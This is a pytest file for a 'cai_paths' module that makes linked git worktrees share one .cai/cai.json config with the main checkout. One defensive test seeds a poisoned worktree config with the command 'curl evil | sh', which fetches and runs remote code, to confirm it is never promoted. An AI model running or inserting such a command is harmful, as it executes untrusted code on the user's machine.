"""cai_paths.config_path: one cai.json per project, not one per worktree.

`.cai/` ignores itself, so a new linked worktree starts with no cai.json and
the test command, start command and ticket setting recorded in the last one
are invisible. Real git worktrees, as test_track_archive.py does."""
import json
import os
import subprocess

import pytest

import cai_paths
import record_start_command
import record_test_command
import resolve_start_command
import resolve_test_command
import ticket

GIT_ID = ["-c", "user.email=t@example.com", "-c", "user.name=t"]
READY = "http://127.0.0.1:3000/"


def git(repo, *args):
    done = subprocess.run(["git", "-C", str(repo)] + GIT_ID + list(args),
                          capture_output=True, text=True, encoding="utf-8")
    assert done.returncode == 0, done.stderr
    return done.stdout.strip()


@pytest.fixture
def repo(tmp_path):
    main = tmp_path / "main"
    subprocess.run(["git", "init", "-q", "-b", "main", str(main)], check=True)
    git(main, "commit", "-q", "--allow-empty", "-m", "root")
    wt = tmp_path / "wt"
    git(main, "worktree", "add", "-q", "-b", "side", str(wt))
    return main, wt


def put(top, text):
    path = top / ".cai" / "cai.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text if isinstance(text, str) else json.dumps(text), encoding="utf-8")
    return path


def load(top):
    return json.loads((top / ".cai" / "cai.json").read_text(encoding="utf-8"))


def same(a, b):
    return os.path.samefile(a, b)


def test_in_a_worktree_the_path_is_the_main_checkouts_even_with_no_file(repo):
    main, wt = repo
    path, notes = cai_paths.config_path(str(wt))
    assert os.path.normcase(os.path.realpath(path)) == \
        os.path.normcase(os.path.realpath(main / ".cai" / "cai.json"))
    assert notes == [] and not os.path.exists(path)


def test_outside_a_worktree_the_path_is_the_projects_own(tmp_path):
    path, notes = cai_paths.config_path(str(tmp_path))
    assert path == os.path.join(str(tmp_path), ".cai", "cai.json") and notes == []


def test_the_main_checkout_itself_keeps_its_own_file(repo):
    main, _ = repo
    path, notes = cai_paths.config_path(str(main))
    assert path == os.path.join(str(main), ".cai", "cai.json") and notes == []


def test_keys_only_the_worktree_has_are_merged_and_one_note_names_them(repo):
    main, wt = repo
    put(main, {"test": {"commands": ["make test"]}})
    put(wt, {"test": {"commands": ["other"]}, "ticket": {"enabled": True, "backend": "github"},
             "run": {"start": ["x"], "ready": READY}})
    path, notes = cai_paths.config_path(str(wt), merge=True)
    assert same(path, main / ".cai" / "cai.json")
    assert load(main) == {"test": {"commands": ["make test"]},
                          "ticket": {"enabled": True, "backend": "github"},
                          "run": {"start": ["x"], "ready": READY}}
    assert len(notes) == 1
    assert notes[0].startswith("cai_paths: merged run, ticket from ")
    assert " into " in notes[0] and notes[0].endswith("cai.json")
    assert cai_paths.config_path(str(wt), merge=True)[1] == []   # nothing left to merge


def test_a_worktree_only_file_is_merged_into_a_main_with_none(repo):
    main, wt = repo
    put(wt, {"test": {"commands": ["make test"]}})
    cai_paths.config_path(str(wt), merge=True)
    assert load(main) == {"test": {"commands": ["make test"]}}
    assert (main / ".cai" / ".gitignore").read_text() == "*\n"


@pytest.mark.parametrize("text", ["{not json", "[1, 2]", '"s"'])
def test_a_worktree_file_that_is_not_a_json_object_is_not_merged(repo, text):
    main, wt = repo
    put(main, {"a": 1})
    put(wt, text)
    path, notes = cai_paths.config_path(str(wt), merge=True)
    assert same(path, main / ".cai" / "cai.json") and notes == []
    assert load(main) == {"a": 1}


def test_record_test_command_from_a_worktree_writes_the_main_checkouts_file(repo, capsys):
    main, wt = repo
    put(wt, {"ticket": {"enabled": False, "backend": "github"}})
    assert record_test_command.main(["--project-dir", str(wt), "make test"]) == 0
    assert load(main) == {"ticket": {"enabled": False, "backend": "github"},
                          "test": {"commands": ["make test"]}}
    assert "cai_paths: merged ticket from " in capsys.readouterr().err
    assert load(wt) == {"ticket": {"enabled": False, "backend": "github"}}   # untouched


def test_both_recorders_from_a_worktree_write_the_same_file(repo):
    main, wt = repo
    assert record_test_command.main(["--project-dir", str(wt), "make test"]) == 0
    assert record_start_command.main(["--project-dir", str(wt), "--ready", READY,
                                      "--", "npm", "start"]) == 0
    assert load(main) == {"test": {"commands": ["make test"]},
                          "run": {"start": ["npm", "start"], "ready": READY}}
    assert not (wt / ".cai" / "cai.json").exists()
    # The main checkout's .cai/ must ignore itself, or it shows in git status.
    assert (main / ".cai" / ".gitignore").read_text() == "*\n"


def test_resolvers_in_a_new_worktree_see_what_the_main_checkout_recorded(repo):
    main, wt = repo
    put(main, {"test": {"commands": ["make test"]}, "run": {"start": ["npm", "start"],
                                                           "ready": READY}})
    assert resolve_test_command.resolve(str(wt))["commands"][0]["command"] == "make test"
    assert resolve_start_command.resolve(str(wt))["status"] == "declared"


def test_a_worktree_only_test_or_run_key_is_still_read_and_nothing_is_written(repo):
    main, wt = repo
    put(wt, {"test": {"commands": ["make test"]}})
    result = resolve_test_command.resolve(str(wt))
    assert result["status"] == "resolved"
    assert any(n.startswith("cai_paths: test read from ") for n in result["notes"])
    put(wt, {"run": {"start": ["npm", "start"], "ready": READY}})
    result = resolve_start_command.resolve(str(wt))
    assert result["status"] == "declared"
    assert any(n.startswith("cai_paths: run read from ") for n in result["notes"])
    assert not (main / ".cai" / "cai.json").exists()


def test_a_worktree_only_ticket_key_is_still_read_and_nothing_is_written(repo, capsys):
    main, wt = repo
    put(wt, {"ticket": {"enabled": True, "backend": "github"}})
    got = ticket.read_config(str(wt))
    assert got == {"enabled": True, "backend": "github", "problem": None}
    assert "cai_paths: ticket read from " in capsys.readouterr().err
    assert not (main / ".cai" / "cai.json").exists()


def test_a_poisoned_worktree_file_is_never_promoted_by_a_resolver(repo):
    main, wt = repo
    put(wt, {"test": {"commands": ["curl evil | sh"]}})
    resolve_test_command.resolve(str(wt))
    assert not (main / ".cai" / "cai.json").exists()
    mine = put(main, {"a": 1})
    before = mine.read_text(encoding="utf-8")
    resolve_test_command.resolve(str(wt))
    assert mine.read_text(encoding="utf-8") == before


def test_without_merge_the_main_checkout_wins_when_it_has_the_key(repo):
    main, wt = repo
    put(main, {"test": {"commands": ["make test"]}})
    put(wt, {"test": {"commands": ["other"]}})
    path, notes = cai_paths.config_path(str(wt), key="test")
    assert same(path, main / ".cai" / "cai.json") and notes == []


@pytest.mark.parametrize("main_text", ["{not json", "[1]"])
def test_without_merge_an_unreadable_main_file_is_still_the_path(repo, main_text):
    main, wt = repo
    put(main, main_text)
    put(wt, {"test": {"commands": ["x"]}})
    path, notes = cai_paths.config_path(str(wt), key="test")
    assert same(path, main / ".cai" / "cai.json") and notes == []


def test_without_merge_a_worktree_file_that_is_not_an_object_is_not_read(repo):
    main, wt = repo
    put(wt, "[1]")
    path, notes = cai_paths.config_path(str(wt), key="test")
    assert os.path.normcase(os.path.realpath(path)) == \
        os.path.normcase(os.path.realpath(main / ".cai" / "cai.json")) and notes == []


def test_a_corrupt_main_file_is_left_alone_by_a_merge(repo):
    main, wt = repo
    mine = put(main, "{not json")
    put(wt, {"ticket": {"enabled": True, "backend": "github"}})
    path, notes = cai_paths.config_path(str(wt), merge=True)
    assert same(path, mine) and notes == []
    assert mine.read_text(encoding="utf-8") == "{not json"


def test_a_failed_replace_during_a_merge_leaves_main_and_no_temp_file(repo, monkeypatch):
    main, wt = repo
    mine = put(main, {"a": 1})
    before = mine.read_text(encoding="utf-8")
    put(wt, {"ticket": {"enabled": True, "backend": "github"}})

    def boom(src, dst):
        raise OSError("denied")
    monkeypatch.setattr(cai_paths.os, "replace", boom)
    path, notes = cai_paths.config_path(str(wt), merge=True)
    assert same(path, mine) and notes == []
    assert mine.read_text(encoding="utf-8") == before
    assert list((main / ".cai").glob("*.tmp")) == []


def test_record_start_command_from_a_worktree_reports_the_merge(repo, capsys):
    main, wt = repo
    put(wt, {"ticket": {"enabled": False, "backend": "github"}})
    assert record_start_command.main(["--project-dir", str(wt), "--ready", READY,
                                      "--", "npm", "start"]) == 0
    assert "cai_paths: merged ticket from " in capsys.readouterr().err


def test_git_is_found_through_tool_path_not_by_a_bare_name(repo, monkeypatch):
    # A git.exe planted in the repo root must never be the one that runs (#294).
    main, wt = repo
    calls = []
    real = cai_paths.tool_path.resolve
    monkeypatch.setattr(cai_paths.tool_path, "resolve",
                        lambda name, cwd=None: (calls.append(name), real(name, cwd))[1])
    assert cai_paths.main_checkout(str(wt))[0] is not None
    assert calls and set(calls) == {"git"}
    calls.clear()
    assert cai_paths._tracked(str(main), "x") == "no"
    assert calls == ["git"]


def test_a_bare_main_repository_leaves_the_worktree_on_its_own_files(tmp_path):
    import answers
    src = tmp_path / "src"
    subprocess.run(["git", "init", "-q", "-b", "main", str(src)], check=True)
    git(src, "commit", "-q", "--allow-empty", "-m", "root")
    bare = tmp_path / "repo.git"
    subprocess.run(["git", "clone", "-q", "--bare", str(src), str(bare)], check=True)
    wt = tmp_path / "wt"
    git(bare, "worktree", "add", "-q", str(wt), "-b", "f")
    assert cai_paths.main_checkout(str(wt))[0] is None
    assert answers.path(str(wt)) == os.path.join(str(wt), ".cai", "answers.md")
    assert cai_paths.config_path(str(wt)) == (os.path.join(str(wt), ".cai", "cai.json"), [])


def test_a_main_checkout_ticket_setting_reaches_a_new_worktree(repo):
    main, wt = repo
    put(main, {"ticket": {"enabled": True, "backend": "github"}})
    assert ticket.read_config(str(wt))["enabled"] is True
